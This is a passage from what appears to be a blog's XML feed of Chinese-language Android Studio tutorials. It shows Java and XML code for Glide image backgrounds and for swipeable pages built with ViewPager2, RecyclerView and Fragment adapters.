(Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.JELLY_BEAN) &#123;<br>                img.setBackground(drawable);<br>            &#125;<br>        &#125;<br>    &#125;);<br><span class="hljs-comment">//new</span><br>        Glide.with(getActivity())<br>                .load(imgsrc)<br>                <span class="hljs-comment">//加上centerCrop后正确显示不在压缩</span><br>                .centerCrop()<br>            <span class="hljs-comment">//设置页面切换需要的时间</span><br>                .crossFade(<span class="hljs-number">1000</span>)<br>                .into(<span class="hljs-keyword">new</span> ViewTarget&lt;View, GlideDrawable&gt;(main) &#123;<br>                    <span class="hljs-comment">//括号里为需要加载的控件</span><br>                    <span class="hljs-meta">@Override</span><br>                    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onResourceReady</span><span class="hljs-params">(GlideDrawable resource,</span></span><br><span class="hljs-params"><span class="hljs-function">                                                GlideAnimation&lt;? <span class="hljs-keyword">super</span> GlideDrawable&gt; glideAnimation)</span> </span>&#123;<br>                        <span class="hljs-keyword">this</span>.view.setBackground(resource.getCurrent());<br>                    &#125;<br>                &#125;);<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Android Studio</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AndroidStudio</tag>
      
      <tag>基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android Studio 多界面滑动</title>
    <link href="/2021/05/19/AndroidStudio/Android%20Studio%20%E5%A4%9A%E7%95%8C%E9%9D%A2%E6%BB%91%E5%8A%A8/"/>
    <url>/2021/05/19/AndroidStudio/Android%20Studio%20%E5%A4%9A%E7%95%8C%E9%9D%A2%E6%BB%91%E5%8A%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="Android-Studio-界面滑动"><a href="#Android-Studio-界面滑动" class="headerlink" title="Android Studio 界面滑动"></a>Android Studio 界面滑动</h1><h1 id="导入recyclerview包"><a href="#导入recyclerview包" class="headerlink" title="导入recyclerview包"></a>导入recyclerview包</h1><p>在build.gradle加上</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">implementation</span> &#x27;androidx.viewpager<span class="hljs-number">2</span>:viewpager<span class="hljs-number">2</span>:<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>&#x27;<br><span class="hljs-attribute">implementation</span> &#x27;androidx.recyclerview:recyclerview:<span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>&#x27;<br></code></pre></div></td></tr></table></figure><h1 id="设置XML"><a href="#设置XML" class="headerlink" title="设置XML"></a>设置XML</h1><p>activity_main.xml</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><br><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">androidx.constraintlayout.widget.ConstraintLayout</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:app</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res-auto&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:tools</span>=<span class="hljs-string">&quot;http://schemas.android.com/tools&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/main&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">tools:context</span>=<span class="hljs-string">&quot;.MainActivity&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">androidx.viewpager2.widget.ViewPager2</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/viewpager&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;match_parent&quot;</span> /&gt;</span><br><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">androidx.constraintlayout.widget.ConstraintLayout</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>item_pager.xml</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">androidx.constraintlayout.widget.ConstraintLayout</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:app</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res-auto&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/container&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/tvTitle&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">&quot;sadfsadfasdfsadf&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textColor</span>=<span class="hljs-string">&quot;#ff44&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toEndOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toStartOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toTopOf</span>=<span class="hljs-string">&quot;parent&quot;</span> /&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">androidx.constraintlayout.widget.ConstraintLayout</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>相应的Adapter</p><p>整体的思路是先完成类的创建之后，查看源码后使用相应的Holder替换相应的</p><p>ViewPagerAdapter.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> android.content.res.Resources;<br><span class="hljs-keyword">import</span> android.view.LayoutInflater;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.view.ViewGroup;<br><span class="hljs-keyword">import</span> android.widget.ImageView;<br><span class="hljs-keyword">import</span> android.widget.LinearLayout;<br><span class="hljs-keyword">import</span> android.widget.TextView;<br><br><span class="hljs-keyword">import</span> androidx.annotation.NonNull;<br><span class="hljs-keyword">import</span> androidx.constraintlayout.widget.ConstraintLayout;<br><span class="hljs-keyword">import</span> androidx.recyclerview.widget.RecyclerView;<br><br><span class="hljs-keyword">import</span> com.lwx.viewpagesapplication.Bean.Content;<br><span class="hljs-keyword">import</span> com.lwx.viewpagesapplication.R;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ViewPagerAdapter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">RecyclerView</span>.<span class="hljs-title">Adapter</span>&lt;<span class="hljs-title">ViewPagerAdapter</span>.<span class="hljs-title">ViewPagerViewHolder</span>&gt; </span>&#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 设置预备的值</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> List&lt;String&gt; titles=<span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 初始化时进行赋值</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ViewPagerAdapter</span><span class="hljs-params">()</span></span>&#123;<br>        titles.add(<span class="hljs-string">&quot;one++++++++++++++++&quot;</span>);<br>        titles.add(<span class="hljs-string">&quot;two+++++++++++++++&quot;</span>);<br>    &#125;<br>    <span class="hljs-meta">@NonNull</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> ViewPagerViewHolder <span class="hljs-title">onCreateViewHolder</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> ViewGroup parent, <span class="hljs-keyword">int</span> viewType)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ViewPagerViewHolder(LayoutInflater.from(parent.getContext()).inflate(R.layout.item_pager,parent,<span class="hljs-keyword">false</span>));<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onBindViewHolder</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> ViewPagerViewHolder holder, <span class="hljs-keyword">int</span> position)</span> </span>&#123;<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">        * 具体的设置界面</span><br><span class="hljs-comment">        */</span><br>        holder.mTv.setText(titles.get(position));<br>        <span class="hljs-keyword">int</span> imgsrc= Content.getContext().getResources().getIdentifier(<span class="hljs-string">&quot;img&quot;</span>+position,<span class="hljs-string">&quot;drawable&quot;</span>,<span class="hljs-string">&quot;com.lwx.viewpagesapplication&quot;</span>);<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 利用Glide加载背景图片</span><br><span class="hljs-comment">         */</span><br>        Glide.with(Content.getContext())<br>                .load(imgsrc)<br>                .asBitmap()<br>                .into(<span class="hljs-keyword">new</span> SimpleTarget&lt;Bitmap&gt;(<span class="hljs-number">1080</span>,<span class="hljs-number">2340</span>) &#123;<br>                    <span class="hljs-meta">@Override</span><br>                    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onResourceReady</span><span class="hljs-params">(Bitmap resource, GlideAnimation&lt;? <span class="hljs-keyword">super</span> Bitmap&gt; glideAnimation)</span> </span>&#123;<br>                        Drawable drawable = <span class="hljs-keyword">new</span> BitmapDrawable(resource);<br>                        <span class="hljs-keyword">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.JELLY_BEAN) &#123;<br>                            holder.mContainer.setBackground(drawable);<br>                        &#125;<br>                    &#125;<br>                &#125;);<br>        <span class="hljs-comment">//直接设置图片</span><br>        <span class="hljs-comment">//holder.mContainer.setBackgroundResource(imgsrc);</span><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getItemCount</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-comment">//设置多少个界面</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ViewPagerViewHolder</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">RecyclerView</span>.<span class="hljs-title">ViewHolder</span></span>&#123;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 定义需要的控件</span><br><span class="hljs-comment">         */</span><br>        TextView mTv;<br>        ConstraintLayout mContainer;<br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ViewPagerViewHolder</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> View itemView)</span> </span>&#123;<br>            <span class="hljs-keyword">super</span>(itemView);<br>            <span class="hljs-comment">/**</span><br><span class="hljs-comment">             * 为找到具体控件</span><br><span class="hljs-comment">             */</span><br>            mTv=itemView.findViewById(R.id.tvTitle);<br>            mContainer=itemView.findViewById(R.id.container);<br><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>MainActivity.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lwx.viewpagesapplication;<br><br><span class="hljs-keyword">import</span> androidx.appcompat.app.ActionBar;<br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><span class="hljs-keyword">import</span> androidx.constraintlayout.widget.ConstraintLayout;<br><span class="hljs-keyword">import</span> androidx.recyclerview.widget.RecyclerView;<br><span class="hljs-keyword">import</span> androidx.viewpager2.widget.ViewPager2;<br><br><span class="hljs-keyword">import</span> android.graphics.Color;<br><span class="hljs-keyword">import</span> android.os.Build;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.view.View;<br><br><span class="hljs-keyword">import</span> com.lwx.viewpagesapplication.Adapter.ViewPagerAdapter;<br><span class="hljs-keyword">import</span> com.lwx.viewpagesapplication.Bean.Content;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AppCompatActivity</span> </span>&#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 定义需要的控件及方法</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> ViewPager2 pager;<br>    <span class="hljs-keyword">private</span> ConstraintLayout main;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_main);<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 直接隐藏导航栏</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">if</span> (Build.VERSION.SDK_INT &gt;= <span class="hljs-number">21</span>) &#123;<br>            View decorView = getWindow().getDecorView();<br>            <span class="hljs-keyword">int</span> option = View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN<br>                    | View.SYSTEM_UI_FLAG_LAYOUT_STABLE;<br>            decorView.setSystemUiVisibility(option);<br>            getWindow().setStatusBarColor(Color.TRANSPARENT);<br>        &#125;<br>        ActionBar actionBar = getSupportActionBar();<br>        actionBar.hide();<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 为Content赋值</span><br><span class="hljs-comment">         */</span><br>        Content.setContext(MainActivity.<span class="hljs-keyword">this</span>);<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 将控件及方法赋值</span><br><span class="hljs-comment">         */</span><br>        pager=findViewById(R.id.viewpager);<br>        main=findViewById(R.id.main);<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 构造Adapter</span><br><span class="hljs-comment">         */</span><br>        RecyclerView.Adapter viewPagerAdapter=<span class="hljs-keyword">new</span> ViewPagerAdapter();<br>        pager.setAdapter(viewPagerAdapter);<br><br><br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h1 id="Fragment-实现的滑动"><a href="#Fragment-实现的滑动" class="headerlink" title="Fragment 实现的滑动"></a>Fragment 实现的滑动</h1><p>创建响应的Fragment界面</p><p>重要文件如下</p><p>Adapter</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> androidx.annotation.NonNull;<br><span class="hljs-keyword">import</span> androidx.fragment.app.Fragment;<br><span class="hljs-keyword">import</span> androidx.fragment.app.FragmentManager;<br><span class="hljs-keyword">import</span> androidx.lifecycle.Lifecycle;<br><span class="hljs-keyword">import</span> androidx.viewpager2.adapter.FragmentStateAdapter;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyFragmentPagerAdapter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">FragmentStateAdapter</span> </span>&#123;<br>    List&lt;Fragment&gt; fragmentList=<span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">MyFragmentPagerAdapter</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> FragmentManager fragmentManager, <span class="hljs-meta">@NonNull</span> Lifecycle lifecycle,List&lt;Fragment&gt; fragments)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>(fragmentManager, lifecycle);<br>        fragmentList=fragments;<br>    &#125;<br><br>    <span class="hljs-meta">@NonNull</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Fragment <span class="hljs-title">createFragment</span><span class="hljs-params">(<span class="hljs-keyword">int</span> position)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> fragmentList.get(position);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getItemCount</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> fragmentList.size();<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>Fragment</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> android.os.Bundle;<br><br><span class="hljs-keyword">import</span> androidx.fragment.app.Fragment;<br><br><span class="hljs-keyword">import</span> android.view.LayoutInflater;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.view.ViewGroup;<br><br><span class="hljs-keyword">import</span> com.lwx.blog.R;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * A simple &#123;<span class="hljs-doctag">@link</span> Fragment&#125; subclass.</span><br><span class="hljs-comment"> * Use the &#123;<span class="hljs-doctag">@link</span> DiaryFragment#newInstance&#125; factory method to</span><br><span class="hljs-comment"> * create an instance of this fragment.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DiaryFragment</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Fragment</span> </span>&#123;<br><br>    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Rename parameter arguments, choose names that match</span><br>    <span class="hljs-comment">// the fragment initialization parameters, e.g. ARG_ITEM_NUMBER</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String ARG_PARAM1 = <span class="hljs-string">&quot;param1&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String ARG_PARAM2 = <span class="hljs-string">&quot;param2&quot;</span>;<br><br>    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Rename and change types of parameters</span><br>    <span class="hljs-keyword">private</span> String mParam1;<br>    <span class="hljs-keyword">private</span> String mParam2;<br>    <span class="hljs-comment">//获取当前界面</span><br>    <span class="hljs-keyword">private</span> View rootView;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">DiaryFragment</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-comment">// Required empty public constructor</span><br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Use this factory method to create a new instance of</span><br><span class="hljs-comment">     * this fragment using the provided parameters.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> param1 Parameter 1.</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> param2 Parameter 2.</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> A new instance of fragment DiaryFragment.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Rename and change types and number of parameters</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> DiaryFragment <span class="hljs-title">newInstance</span><span class="hljs-params">(String param1, String param2)</span> </span>&#123;<br>        DiaryFragment fragment = <span class="hljs-keyword">new</span> DiaryFragment();<br>        Bundle args = <span class="hljs-keyword">new</span> Bundle();<br>        args.putString(ARG_PARAM1, param1);<br>        args.putString(ARG_PARAM2, param2);<br>        fragment.setArguments(args);<br>        <span class="hljs-keyword">return</span> fragment;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState);<br>        <span class="hljs-keyword">if</span> (getArguments() != <span class="hljs-keyword">null</span>) &#123;<br>            mParam1 = getArguments().getString(ARG_PARAM1);<br>            mParam2 = getArguments().getString(ARG_PARAM2);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//初始界面布局</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> View <span class="hljs-title">onCreateView</span><span class="hljs-params">(LayoutInflater inflater, ViewGroup container,</span></span><br><span class="hljs-params"><span class="hljs-function">                             Bundle savedInstanceState)</span> </span>&#123;<br>        <span class="hljs-comment">// Inflate the layout for this fragment</span><br>        <span class="hljs-keyword">return</span> inflater.inflate(R.layout.fragment_diary, container, <span class="hljs-keyword">false</span>);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>MainActivity</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 